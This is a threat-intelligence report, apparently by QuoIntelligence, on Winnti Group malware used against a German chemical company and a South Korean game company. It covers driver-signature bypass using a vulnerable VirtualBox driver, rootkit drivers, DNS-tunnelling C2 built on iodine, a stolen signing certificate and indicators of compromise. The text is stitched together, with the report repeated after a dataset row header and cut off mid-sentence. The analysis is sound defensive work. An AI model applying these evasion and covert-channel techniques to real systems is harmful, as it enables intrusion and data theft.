**SHA1**: 06256946a69409cd18859bfa429184a282374d76 **SHA256:** df6af36626d375c5e8aff45c64bfc1975d753b109e126a6cb30ee0523550329c | 2015-08-06 01:52:51 | TmPfwRVS.dll | | **MD5**: cf140dc4cad9e8216545593a4c08c7be **SHA1**: 2b319b44451abb0596b9187e06f1fb7b4ace969d **SHA256**: bfa8948f72061eded548ef683830de068e438a6eaf2da44e0398a37ac3e26860 | 2015-08-05 12:08:00 | driver1.sys | | **MD5**: cc95391d75ce2443740f60114fe30ae9 **SHA1**: 30d1dd1dd4f0ace7a4f2c24e31fb6a0ee33e8a3a **SHA256**: 8ddc6dd9fc3640cd786dfbc72212cd001d9369817aa69e0a2fa25e29560badcf | 2015-05-05 11:31:13 | driver2.sys | | **MD5**: b4e66b445b39d0368bbe4b91a3cd98ff **SHA1**: 2bc358ddc72f59ba0373b8635ab08ad747c12180 **SHA256**: 1865013aaca0f12679e35f06c4dad4e00d6372415ee8390b17b4f910fee1f7a2 | 2014-12-15 16:06:41 | dsefix.exe | | **MD5**: eaea9ccb40c82af8f3867cd0f4dd5e9d **SHA1**: 7c1b25518dee1e30b5a6eaa1ea8e4a3780c24d0c **SHA256**: cf3a7d4285d65bf8688215407bce1b51d7c6b22497f09021f0fce31cbeb78986 | 2008-May-31 02:18:53 UTC | vboxdrv.sys | *Table 2 – Additional artifacts contained by bfa8948f72061eded548ef683830de068e438a6eaf2da44e0398a37ac3e26860* **Analysis of dsefix.exe** This is essentially [Windows x64 Driver Signature Enforcement Overrider](https://github.com/hfiref0x/DSEFix) (DSEFix), used to temporarily disable the driver signature enforcement on Windows systems by using an included old, legit VirtualBox driver, both signed and exploitable. By running dsefix.exe, the malware can bypass driver verification and install its own drivers. We identified the following two drivers which were embedded in the earlier described main artifact. To note that this technique does not work on moden Windows (e.g. Windows 10) – yet another piece of evidence that this malware was designed and used multiple years ago. **Analysis of vboxdriver** This is the vulnerable, correctly signed with a digital certificate, VirtualBox driver that is used for exploitation. It is used regularly by various threat actors, and by the previously highlighted dsefix.exe*.* The driver can also be used to perform the Turla Driver Loader (TDL) exploitation [technique](https://github.com/hfiref0x/TDL), a similar technique as DSEFix. **Analysis of driver1.sys** In late 2019, [ExaTrack](https://exatrack.com/public/winnti_EN.pdf)released their analysis of a signed Winnti rootkit previously observed in the wild, which we confirm is essentially the same rootkit driver. The sample is capable of injecting raw packets into the network and receiving special formatted packets. In comparison, our variant has the same exact number of bytes, and there are large parts exactly matching. **Analysis of driver2.sys** This rootkit driver seems to be largely the same as driver1.sys with the same characteristics including structure, I/O control, and device strings. However, this driver supports different versions of Windows. It checks for ranges of Windows New Technology (NT) build numbers and returns early. ### C2 DNS Tunneling By analyzing the malware, it is possible to find two network indicators within its code: ``` ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Figure-2-1024x82.png) ``` *Figure 3 – observed network IoCs in Winnti sample* The hardcoded 208.67.222.222 is a legitimate OpenDNS DNS server (resolver1.opendns.com). This IP is pushed into a list that is generated by the malware at runtime. Likely, the initiation routine also populates the list with the system’s DNS, and the OpenDNS server is only used as fallback case to ensure the C2 domain gets resolved. The dick[.]mooo[.]com FQDN name is offered by [FreeDNS](https://freedns.afraid.org/), which is a free dynamic DNS service. Notably, in the last years, multiple researchers have reported Winnti/PlugX C2 hostnames hosted in the mooo[.]com zone. In the code we observed that a dot (.) is enforced before the FQDN*.* Additional analysis revealed that the malware generates subdomains with base128 encoding, and append them to FQDN. ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Figure-y.png) *Code 1 – Hostname length restriction* Further, dots are added into it every 57 characters potentially as a hostname length restriction, suggesting the expectation of long hostnames. We confirm the buffer can support FQDN’s up to 2000 characters. Upon further investigation we found out that the malware includes the open source [iodine source code](https://github.com/yarrick/iodine) – software that enables the tunneling of IPv4 data through a DNS server. Interestingly, we are not aware of any earlier documentation highlighting Winnti specifically leveraging iodine for DNS tunneling. However, researchers at the Ruhr University Bochum, while hunting for DNS tunnels, [observed](https://www.farsightsecurity.com/assets/documents/A_Study_of_Newly_Observed_Hostnames_and_DNS_Tunneling_in_the_Wild.pdf) APT32 and Wekby APT groups using NULL and TXT records as a C2 communication channel, as well as mentioning the mooo[.]com top level domain in their findings. The implementation of iodine used in the Winnti sample is integrated and uses some custom wrapper, as evidence by the matching functions we discuss in further detail in the following section. **Use of Iodine for C2 DNS Tunneling** The iodine DNS tunneling solution is embedded in the DLL that is initially loaded and executed in memory, and includes at least the following 15 matching functions: *![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)![](https://quointelligence.eu/wp-content/uploads/2020/04/Table-3.png)* *Table 3 – Malware DLL Functions* For instance, the 64bit executable contains the build\_hostname function (Code 2), which corresponds with the older 32bit version (compiled with debug symbols) of iodine 0.6.0 (Code 3): ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/code_2.png) *Code 2- iodine\_0-6-0\_build\_hostname* ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/code-3.png) *Code 3- iodine\_0-6-0\_build\_hostname* Based on the presence of the functions base128\_blksize\_enc and base128\_blksize\_raw, we determined the version used, while not exactly known, is from before May 2017 when a patch removed those functions. Further, comparative analysis indicates that for the implementation of iodine in this Winnti attack operation, there is no perfect match for the two versions having 64bit pre-compiled binaries. This indicates iodine was compiled from source, and it is reasonable it is being used as a library, and not in its normal distribution format of a standalone executable. The DNS Tunneling technique adopted by the malware through the use of iodine is detailed in the figure below. ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Picture-3.png) *Figure 4 – C2 channel over DNS* 1.The malware generates a hostname and appends it to the embedded C2 dick[.]mooo[.]com, and makes a NULL query to the resulted FQDN (e.g. abcde is appended to .dick[.]mooo[.]com). Notably, NULL and TXT DNS request types are iodine’s preferred channels since they are “[*expected to provide the largest downstream bandwidth*](https://github.com/yarrick/iodine)”. It is hence not a coincidence that researchers at Ruhr University Bochum also observed an extensive use of NULL request types for DNS Tunneling purposes in their research. 2.The infected host sends the DNS query to one of the DNS servers included in the list populated at runtime, eventually to the OpenDNS fallback server. At this point the DNS server executes a recursive DNS query by contacting the Name Servers (NS) of each zone, until the Authoritative NS of dick[.]mooo[.]com is obtained. To note, FreeDNS does provide users the capability to delegate the authority of their subdomains to external NS. In the described scenario, attackers delegated the NS of their subdomain to use their NS as a de-facto C2 server. 3.The DNS server returns the authoritative answer by forwarding the content of the NULL record type to the infected host. Notably, the legit DNS server acts as a proxy between the infected host and the malicious server, by making impossible for defenders the application of any filtering at the Network (L3) level. **The NULL DNS record type** The implementation of NULL type tunneling can be observed in the following excerpt taken while reversing the malware: ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Picture-2.png) The third argument when calling dns\_encode shall be of the type “struct query” from Iodine’s [dns.c](https://github.com/yarrick/iodine/blob/27e5d6fadd997ff167c70a431d41adae26428d41/src/dns.c#L232) ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Picture-4.png) According to [common.h](https://github.com/yarrick/iodine/blob/27e5d6fadd997ff167c70a431d41adae26428d41/src/common.h#L86), “struct query” is defined as: ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Picture-6-300x192.png) Since QUERY\_NAME\_SIZE equals to 512 (4 *128 – integers are 4 bytes) the query[128] call obtained from the reversing activity is indeed the DNS query type. As noted, reversing activity detailed the query[128] value to be 0xa. From Iodine’s [windows.h](https://github.com/yarrick/iodine/blob/27e5d6fadd997ff167c70a431d41adae26428d41/src/windows.h#L39) T\_NULL is DNS\_TYPE\_NULL ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Picture-7-300x136.png) Finally, from [Windows’s documentation](https://docs.microsoft.com/en-us/windows/win32/dns/dns-constants), DNS\_TYPE\_NULL is actually a Windows constant equal to 0xa ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Picture-8-274x300.png) ### Winnti Signed Code With Digital Certificate from IQ Technology During our analysis of the Winnti sample configured to target the German chemical company, our comparative analysis of other Winnti related drivers revealed a digital certificate issued to *IQ Technology*, a Taiwanese company producing Natural language processing (NLP) and Artificial Intelligence (AI) software. The rootkit driver aligns with the already known driver1.sys*.* While it is a known TTP that Winnti attributed attacks have involved stolen digital certificates for code signing its malware components, the use of this certificate is not publicly discussed, except for a brief report from a security researcher apparently associated with a Vietnamese security company. Although the report is no longer online, the discussed [sample](https://hybrid-analysis.com/sample/a5d6139921576c3aedfc64e2b37ae1a64f3160bd1bb70d4fc7fce956029e7d55?environmentId=2&lang=en) contains a compilation timestamp of August 2015, which is the earliest one observed in the wild that we identified using this digital certificate. At the time of analysis, the digital certificate was already revoked. The sample’s structure, debug symbols, and explanatory debug messages included within suggests it is highly likely be a development version. Additionally, the compilation timestamp indicates the sample was created 20 minutes prior to the *driver1.sys.* Both samples are highly related, and its contents combined with the date of analysis and reporting essentially solidify that it existed in 2015; however, this does not necessarily corroborate to an attack timeframe. ### Sample Targeting South Korean Gaming Company | **HASHES** | **Compilation Timestamp** | | **MD5:** 00961922e22e6a5d30b1d6fbd667d3c4 **SHA1**: 0fd54c26b593bd9e9218492d50d8873521c0ec0d **SHA256:** 4209b457f3b42dd2e1e119f2c9dd5b5fb1d063a77b49c7acbae89bbe4e284fb9 | 2016-03-07 09:44:01 | *Table 3 – observed network IoCs in Winnti sample* On 21 February, we detected the new submission of a 64-bit Winnti executable to a public online malware scanning service. As multiple researchers have reported, Winnti operators embed the name of their target directly into the malware, but in an obfuscated manner. **Binary Analysis** The sample resembles the Winnti Dropper Install.exe described by ESET, since it is a command line executable used to drop and load additional encrypted payload: ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/rundl.png) Unfortunately we were not able to find the payload meant to be decrypted by this dropper. However, we were able to extract the malware’s configuration file and identify the intended target. In this case, the following string was included within the extracted configuration: ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/gravity.png) Based on previous knowledge and targeting of the Winnti Group, we assess that this sample was likely used to target Gravity Co., Ltd., a South Korean video game company. The company is known for its Massive Multiplayer Online Role Playing Game (MMORPG) [*Ragnarok Online*](http://www.gravity.co.kr/en/games/), which is also offered as a mobile application. As we have also reported in the past, the video game industry is one of the preferred targets of the Winnti Group, especially for those companies operating in South Korea and Taiwan. Interestingly, ESET researchers, while reporting on multiple Winnti Group campaigns targeting the video game industry, listed in their report a C2 server having a Campaign ID ***GRA** KR 0629*. ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Picture-9.png) *Excerpt from ESET Research White paper “*[*CONNECTING THE DOTS Exposing the arsenal and methods of the Winnti Group*](https://www.welivesecurity.com/wp-content/uploads/2019/10/ESET_Winnti.pdf)*”* At this time, we do not have any further evidence supporting a potential link between the sample we analysed and the C2 detailed by ESET, but the coincidence between the C2 Campaign ID/Location with the Campaign ID we extracted from the Winnti dropper is worth noting. ### Conclusion The Winnti Group has exhibited their ability to breach different organizations and conduct sophisticated attack operations, typically motivated by espionage and financial gain, with various TTPs and malware toolkits. While attribution is not concrete due to the complexity of the group, there are links that can be drawn between operations which suggest the threat actors purporting the attacks are likely operating within the Winnti Group, or at least sharing resources. The detection of this unreported Winnti variant uploaded to VirusTotal and targeting a German chemical company aligns with our prior observations and research from [previous intelligence reporting](https://web.br.de/interaktiv/winnti/index.html)highlighting Winnti Group’s interest in German DAX companies. As a result, organizations of all sizes, but especially small to medium sized companies, including Germany’s *hidden champions*, should prepare against such threats as they are vital to the economic ecosystem and continuous development of niche markets. Government oversight (local, regional, and across the EU) should ensure susceptible organizations such as these are following regulation and implementing security best practices to protect against future attacks. Appendix -------- ### Indicators of Compromise 4209b457f3b42dd2e1e119f2c9dd5b5fb1d063a77b49c7acbae89bbe4e284fb9 cf3a7d4285d65bf8688215407bce1b51d7c6b22497f09021f0fce31cbeb78986 1865013aaca0f12679e35f06c4dad4e00d6372415ee8390b17b4f910fee1f7a2 8ddc6dd9fc3640cd786dfbc72212cd001d9369817aa69e0a2fa25e29560badcf bfa8948f72061eded548ef683830de068e438a6eaf2da44e0398a37ac3e26860 df6af36626d375c5e8aff45c64bfc1975d753b109e126a6cb30ee0523550329c 4209b457f3b42dd2e1e119f2c9dd5b5fb1d063a77b49c7acbae89bbe4e284fb9 cf3a7d4285d65bf8688215407bce1b51d7c6b22497f09021f0fce31cbeb78986 1865013aaca0f12679e35f06c4dad4e00d6372415ee8390b17b4f910fee1f7a2 8ddc6dd9fc3640cd786dfbc72212cd001d9369817aa69e0a2fa25e29560badcf bfa8948f72061eded548ef683830de068e438a6eaf2da44e0398a37ac3e26860 df6af36626d375c5e8aff45c64bfc1975d753b109e126a6cb30ee0523550329c *.dick[.]mooo[.]com 208[.]67[.]222[.]222 45[.]248[.]85[.]200 ### MITRE ATT&CK | **Tactic** | **Technique** | **Recommended Course of Action** | | Persistence / Privilege Escalation | [T1215](https://attack.mitre.org/techniques/T1215/) Kernel Modules and Extensions [T1068](https://attack.mitre.org/techniques/T1068/) Exploitation for Privilege Escalation | Anti-Virus software and Advanced End-Point solution can drastically reduce the risk of both techniques. | | Defense Evasion | [T1009](https://attack.mitre.org/techniques/T1009/) Binary Padding [T1014](https://attack.mitre.org/techniques/T1014/) Rootkit [T1116](https://attack.mitre.org/techniques/T1116/) Code Signing | Many of the samples analysed were signed with expired / revoked certificate. Enforce signature validation via Group Policies for executables | | Exfiltration | [T1022](https://attack.mitre.org/techniques/T1022/) Data Encrypted [T1048](https://attack.mitre.org/techniques/T1048/) Exfiltration Over Alternative Protocol | – For DNS Tunnel, ensure that DNS logs are collected and reviewed. – DNS telemetic data should be also collected in order to spot frequent and heavy loaded DNS communication that are definitely not related to an usual DNS query. – FreeDNS and DynDNS servers should be blacklisted/synkholed if not strictly required – DNS NULL type queries should not be avoided. Only the required record types should be allowed. | * [Follow](https://twitter.com/QuoIntelligence ""Follow on Twitter"")[Follow](https://twitter.com/QuoIntelligence ""Twitter"") * [Follow](https://www.linkedin.com/company/quointelligence/ ""Follow on LinkedIn"")[Follow](https://www.linkedin.com/company/quointelligence/ ""LinkedIn"") Join Our Newsletter. -------------------- Subscribe to our newsletter to receive Weekly Intelligence Summaries, cyber news, and exciting updates. Only valid business emails will be approved. Please enable JavaScript in your browser to complete this form.Name *FirstLastBusiness Email *Checkboxes ** I have read and agree to the [Privacy Policy](https://quointelligence.eu/privacy-policy). GDPR Agreement ** I consent to having this website store my submitted information so they can respond to my inquiry. MessageSubscribe"
annoctr,annoctr/AnnoCTR/text/train/quoteintelligence_2020-04-20_winnti-group-insights-from-the.txt,quoteintelligence_2020-04-20_winnti-group-insights-from-the,G0025,"WINNTI GROUP: Insights From the Past Apr 20, 2020 Newly uncovered DNS tunnelling technique, and new campaign against South Korean gaming company ---------------------------------------------------------------------------------------------- ### Executive Summary * In January 2020, [QuoIntelligence](https://quointelligence.eu/) (QuoINT) detected a new Winnti sample uploaded to a public virus scanner from a German location. Following our preliminary analysis, we assessed with high confidence that the sample was used to target a previously unreported German chemical company. As part of our responsible disclosure, we alerted the affected entity, the local Law Enforcements, and our clients. * In the following weeks after our internal reporting, the German news media source Tagesschau [reported](https://www.tagesschau.de/investigativ/ndr/hackerangriff-chemieunternehmen-101.html) our initial detection and analysis of the sample, and confirmed the chemical company’s awareness of the attack in the second half of 2019. * The Winnti sample we analysed was highly likely developed in 2015, and likely used around this year for the first time, it is unclear how long the compromise existed in the compromised environment. * Although the malware was likely used years ago, further analysis revealed a previously unreported C2 technique never attributed to any Winnti Group’s toolkits. * The technique relies on a DNS Tunneling communication channel through a custom implementation of the [iodine source code](https://github.com/yarrick/iodine), an open-source software that enables the tunneling of IPv4 data through a DNS server. * Additionally, we uncovered a previously unknown stolen digital certificate being used to digitally sign Winnti-related attack components, and the targeting of a previously-unreported South Korean video game company. * The sophistication of the techniques we uncovered confirms that the Winnti Group is a highly sophisticated, and highly committed Advanced Persistent Group targeting a plethora of different industry sectors in Europe and South Asia. ### Introduction The Winnti Group (also known as APT41, BARIUM, and Blackfly) is an alleged Chinese state-sponsored umbrella organization in China’s intelligence branch linked through their use of shared goals and attack resources. The suspected state-sponsor link to China’s government pinpoints that it likely has an incentive to continue targeting a variety of industries, especially one’s highlighted as priority for China’s economic development. On Friday, 13 January, QuoIntelligence (QuoINT) detected a new Winnti sample uploaded to a public virus scanner from a German location. Following our preliminary analysis, we assessed with high confidence that the sample was used to target a previously unreported German chemical company. Additionally, during our analysis we uncovered a previously unknown stolen digital certificate being used to digitally sign Winnti related drivers, and a potential campaign against an already known South Korean video game company. In the last year, researchers and journalists have publicly disclosed that the Winnti group targeted and eventually compromised Henkel (2014), BASF (2015), Bayer (2018) and Roche (2019). This most recent previously unreported German chemical company is yet another German chemical company targeted by Winnti since 2015. Prior to our analysis this attack activity was not publicly reported. ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Picture-1-1.png) *Figure 1: Timeline of attacks located in Germany and attributed to Winnti* In December 2019, Germany’s Federal Office for the Protection of the Constitution (BfV) released a [report](https://www.verfassungsschutz.de/download/broschuere-2019-12-bfv-cyber-brief-2019-01.pdf) related to the alleged Chinese state sponsored umbrella organization known as the Winnti Group. Through our internal malware analysis, we are confident that the sample we discovered is highly similar to the Winnti sample described in the BfV report. The sample also matches known characteristics of Winnti’s arsenal shared through intelligence reports produced by [ESET](https://www.welivesecurity.com/wp-content/uploads/2019/10/ESET_Winnti.pdf). Further, we have informed the affected company, law enforcement agencies, and sent a Warning to our customers upon detection. ### The Winnti Group The Winnti Group (also known as APT41, BARIUM, and Blackfly) is an alleged Chinese state-sponsored umbrella organization in China’s intelligence branch linked through their use of shared goals and attack resources. Notably, various operations attributed to other China-linked threat actor groups, such as APT17 and Ke3chang, have also leveraged its backdoor malware. Active since at least 2010, initial attacks attributed to the group heavily targeted the gaming industry. However, as researchers have continued to follow and dissect the group and its activity, the group’s target focus has expanded to other industries, including chemical, pharmaceutical, technology, and software. Further, the group’s evolution involves the enhancement, development, and inclusion of new tools and tactics. The suspected state-sponsor link to China’s government, pinpoints that it likely has an incentive to continue targeting a variety of industries, especially one’s highlighted as priority for China’s economic development. In the latest Winnti Group public report, FireEye researchers [reported](https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html) of a new widespread campaign attributed to APT41 which involves exploitation attempts of recently disclosed and patched vulnerabilities for products of Cisco, Citrix, and Zoho. The campaign waves apparently take a more targeted approach to selecting potential victims across various sectors including financials, government, and information technology. According to the researchers, identified victim systems demonstrated the threat actor leveraged commercially available post exploitation tools such as Cobalt Strike and Meterpreter, which are essentially full featured backdoors. Technical Analysis ------------------ ### Sample Targeting German Chemical Company The main artifact uploaded to VirusTotal is a Dynamic Link Library (DLL) file, with a compilation timestamp suggesting the sample was built in August 2015. Although the compilation time might be legitimate, it is not possible to determine when and how long the attackers used this malware. | **HASHES** | **Compilation** **Timestamp** | **Filename** | | **MD5:** c893a12ff72698f09f89f778e4c9cd2b **SHA1**: 06256946a69409cd18859bfa429184a282374d76 **SHA256:** df6af36626d375c5e8aff45c64bfc1975d753b109e126a6cb30ee0523550329c | 2015-08-06 01:52:51 | TmPfwRVS.dll | *Table 1 – Winnti sample* ### Binary Analysis Similar to other Winnti samples, the configuration section contains a string referring to the name of the campaign. In this case, at 0X020, the referred campaign name is the name of the chemical company – redacted for the purposes of this blog. *![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)![](https://quointelligence.eu/wp-content/uploads/2020/04/Figure-X-1.png)* *Figure 2 – Extracted configuration from Winnti sample* The analysed artifact we observed contains the following binaries listed below, and also aligns with observations in the BfV report. | **HASHES** | **Compilation Timestamp** | **Filename** | | **MD5:** c893a12ff72698f09f89f778e4c9cd2b **SHA1**: 06256946a69409cd18859bfa429184a282374d76 **SHA256:** df6af36626d375c5e8aff45c64bfc1975d753b109e126a6cb30ee0523550329c | 2015-08-06 01:52:51 | TmPfwRVS.dll | | **MD5**: cf140dc4cad9e8216545593a4c08c7be **SHA1**: 2b319b44451abb0596b9187e06f1fb7b4ace969d **SHA256**: bfa8948f72061eded548ef683830de068e438a6eaf2da44e0398a37ac3e26860 | 2015-08-05 12:08:00 | driver1.sys | | **MD5**: cc95391d75ce2443740f60114fe30ae9 **SHA1**: 30d1dd1dd4f0ace7a4f2c24e31fb6a0ee33e8a3a **SHA256**: 8ddc6dd9fc3640cd786dfbc72212cd001d9369817aa69e0a2fa25e29560badcf | 2015-05-05 11:31:13 | driver2.sys | | **MD5**: b4e66b445b39d0368bbe4b91a3cd98ff **SHA1**: 2bc358ddc72f59ba0373b8635ab08ad747c12180 **SHA256**: 1865013aaca0f12679e35f06c4dad4e00d6372415ee8390b17b4f910fee1f7a2 | 2014-12-15 16:06:41 | dsefix.exe | | **MD5**: eaea9ccb40c82af8f3867cd0f4dd5e9d **SHA1**: 7c1b25518dee1e30b5a6eaa1ea8e4a3780c24d0c **SHA256**: cf3a7d4285d65bf8688215407bce1b51d7c6b22497f09021f0fce31cbeb78986 | 2008-May-31 02:18:53 UTC | vboxdrv.sys | *Table 2 – Additional artifacts contained by bfa8948f72061eded548ef683830de068e438a6eaf2da44e0398a37ac3e26860* **Analysis of dsefix.exe** This is essentially [Windows x64 Driver Signature Enforcement Overrider](https://github.com/hfiref0x/DSEFix) (DSEFix), used to temporarily disable the driver signature enforcement on Windows systems by using an included old, legit VirtualBox driver, both signed and exploitable. By running dsefix.exe, the malware can bypass driver verification and install its own drivers. We identified the following two drivers which were embedded in the earlier described main artifact. To note that this technique does not work on moden Windows (e.g. Windows 10) – yet another piece of evidence that this malware was designed and used multiple years ago. **Analysis of vboxdriver** This is the vulnerable, correctly signed with a digital certificate, VirtualBox driver that is used for exploitation. It is used regularly by various threat actors, and by the previously highlighted dsefix.exe*.* The driver can also be used to perform the Turla Driver Loader (TDL) exploitation [technique](https://github.com/hfiref0x/TDL), a similar technique as DSEFix. **Analysis of driver1.sys** In late 2019, [ExaTrack](https://exatrack.com/public/winnti_EN.pdf)released their analysis of a signed Winnti rootkit previously observed in the wild, which we confirm is essentially the same rootkit driver. The sample is capable of injecting raw packets into the network and receiving special formatted packets. In comparison, our variant has the same exact number of bytes, and there are large parts exactly matching. **Analysis of driver2.sys** This rootkit driver seems to be largely the same as driver1.sys with the same characteristics including structure, I/O control, and device strings. However, this driver supports different versions of Windows. It checks for ranges of Windows New Technology (NT) build numbers and returns early. ### C2 DNS Tunneling By analyzing the malware, it is possible to find two network indicators within its code: ``` ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Figure-2-1024x82.png) ``` *Figure 3 – observed network IoCs in Winnti sample* The hardcoded 208.67.222.222 is a legitimate OpenDNS DNS server (resolver1.opendns.com). This IP is pushed into a list that is generated by the malware at runtime. Likely, the initiation routine also populates the list with the system’s DNS, and the OpenDNS server is only used as fallback case to ensure the C2 domain gets resolved. The dick[.]mooo[.]com FQDN name is offered by [FreeDNS](https://freedns.afraid.org/), which is a free dynamic DNS service. Notably, in the last years, multiple researchers have reported Winnti/PlugX C2 hostnames hosted in the mooo[.]com zone. In the code we observed that a dot (.) is enforced before the FQDN*.* Additional analysis revealed that the malware generates subdomains with base128 encoding, and append them to FQDN. ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Figure-y.png) *Code 1 – Hostname length restriction* Further, dots are added into it every 57 characters potentially as a hostname length restriction, suggesting the expectation of long hostnames. We confirm the buffer can support FQDN’s up to 2000 characters. Upon further investigation we found out that the malware includes the open source [iodine source code](https://github.com/yarrick/iodine) – software that enables the tunneling of IPv4 data through a DNS server. Interestingly, we are not aware of any earlier documentation highlighting Winnti specifically leveraging iodine for DNS tunneling. However, researchers at the Ruhr University Bochum, while hunting for DNS tunnels, [observed](https://www.farsightsecurity.com/assets/documents/A_Study_of_Newly_Observed_Hostnames_and_DNS_Tunneling_in_the_Wild.pdf) APT32 and Wekby APT groups using NULL and TXT records as a C2 communication channel, as well as mentioning the mooo[.]com top level domain in their findings. The implementation of iodine used in the Winnti sample is integrated and uses some custom wrapper, as evidence by the matching functions we discuss in further detail in the following section. **Use of Iodine for C2 DNS Tunneling** The iodine DNS tunneling solution is embedded in the DLL that is initially loaded and executed in memory, and includes at least the following 15 matching functions: *![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)![](https://quointelligence.eu/wp-content/uploads/2020/04/Table-3.png)* *Table 3 – Malware DLL Functions* For instance, the 64bit executable contains the build\_hostname function (Code 2), which corresponds with the older 32bit version (compiled with debug symbols) of iodine 0.6.0 (Code 3): ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/code_2.png) *Code 2- iodine\_0-6-0\_build\_hostname* ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/code-3.png) *Code 3- iodine\_0-6-0\_build\_hostname* Based on the presence of the functions base128\_blksize\_enc and base128\_blksize\_raw, we determined the version used, while not exactly known, is from before May 2017 when a patch removed those functions. Further, comparative analysis indicates that for the implementation of iodine in this Winnti attack operation, there is no perfect match for the two versions having 64bit pre-compiled binaries. This indicates iodine was compiled from source, and it is reasonable it is being used as a library, and not in its normal distribution format of a standalone executable. The DNS Tunneling technique adopted by the malware through the use of iodine is detailed in the figure below. ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Picture-3.png) *Figure 4 – C2 channel over DNS* 1.The malware generates a hostname and appends it to the embedded C2 dick[.]mooo[.]com, and makes a NULL query to the resulted FQDN (e.g. abcde is appended to .dick[.]mooo[.]com). Notably, NULL and TXT DNS request types are iodine’s preferred channels since they are “[*expected to provide the largest downstream bandwidth*](https://github.com/yarrick/iodine)”. It is hence not a coincidence that researchers at Ruhr University Bochum also observed an extensive use of NULL request types for DNS Tunneling purposes in their research. 2.The infected host sends the DNS query to one of the DNS servers included in the list populated at runtime, eventually to the OpenDNS fallback server. At this point the DNS server executes a recursive DNS query by contacting the Name Servers (NS) of each zone, until the Authoritative NS of dick[.]mooo[.]com is obtained. To note, FreeDNS does provide users the capability to delegate the authority of their subdomains to external NS. In the described scenario, attackers delegated the NS of their subdomain to use their NS as a de-facto C2 server. 3.The DNS server returns the authoritative answer by forwarding the content of the NULL record type to the infected host. Notably, the legit DNS server acts as a proxy between the infected host and the malicious server, by making impossible for defenders the application of any filtering at the Network (L3) level. **The NULL DNS record type** The implementation of NULL type tunneling can be observed in the following excerpt taken while reversing the malware: ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Picture-2.png) The third argument when calling dns\_encode shall be of the type “struct query” from Iodine’s [dns.c](https://github.com/yarrick/iodine/blob/27e5d6fadd997ff167c70a431d41adae26428d41/src/dns.c#L232) ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Picture-4.png) According to [common.h](https://github.com/yarrick/iodine/blob/27e5d6fadd997ff167c70a431d41adae26428d41/src/common.h#L86), “struct query” is defined as: ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Picture-6-300x192.png) Since QUERY\_NAME\_SIZE equals to 512 (4 *128 – integers are 4 bytes) the query[128] call obtained from the reversing activity is indeed the DNS query type. As noted, reversing activity detailed the query[128] value to be 0xa. From Iodine’s [windows.h](https://github.com/yarrick/iodine/blob/27e5d6fadd997ff167c70a431d41adae26428d41/src/windows.h#L39) T\_NULL is 